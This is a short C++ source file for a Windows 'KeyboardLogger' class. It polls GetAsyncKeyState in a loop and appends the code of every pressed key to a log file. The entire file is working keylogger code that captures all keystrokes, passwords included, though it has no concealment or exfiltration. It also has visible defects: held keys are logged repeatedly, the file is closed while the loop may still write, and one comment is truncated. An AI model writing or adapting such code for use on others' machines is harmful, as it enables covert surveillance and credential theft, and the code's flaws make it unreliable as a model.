#include "KeyboardLogger.h"
#include <fstream>
#include <chrono>
#include <ctime>
#include <unordered_map>
#include <windows.h>

KeyboardLogger::KeyboardLogger(const std::string& logFileName) : logFileName_(logFileName) {}

void KeyboardLogger::startLogging() {
    isLogging_ = true;
    logFile_.open(logFileName_, std::ios_base::app);

    while (isLogging_) {
        // Sleep to reduce
        Sleep(10);

        
        for (int i = 8; i <= 255; i++) {
            SHORT result = GetAsyncKeyState(i);
            bool isPressed = result & 0x8000;

            if (isPressed) {
                logFile_ << i << std::endl;
            }
        }
    }

    logFile_.close();
}

void KeyboardLogger::stopLogging() {
    isLogging_ = false;
    logFile_.close();
}
